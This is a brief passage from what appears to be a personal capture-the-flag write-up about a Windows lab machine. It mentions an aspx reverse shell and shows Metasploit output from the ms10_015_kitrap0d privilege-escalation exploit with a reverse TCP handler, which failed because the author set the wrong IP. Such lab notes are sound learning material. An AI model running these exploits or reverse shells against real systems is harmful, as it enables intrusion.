Using guided mode is fine, I thankfully stopped myself from reading the full writeup. after understanding that its a dotnet thingy and the hint about `.aspx` from the guided mode, i figured the reverse shell should be aspx

### If i had FOCUSED

```
msf6 exploit(windows/local/ms10_015_kitrap0d) > exploit

[*] Started reverse TCP handler on 192.168.68.128:4444  <------------
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 2996 launched.
[*] Reflectively injecting the DLL into 2996...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.

```

These exploits would have WORKED, IF I FOCUSEEDDDD  I SET THE WRONG HOST!!! IT WOULD HAVE WORRKEKEKEEDDDD. LITEARLLY ALL OF MY PAYLOADS WHERE CORRECT BUT I NEVER HAD THE RIGHT IP!!!!
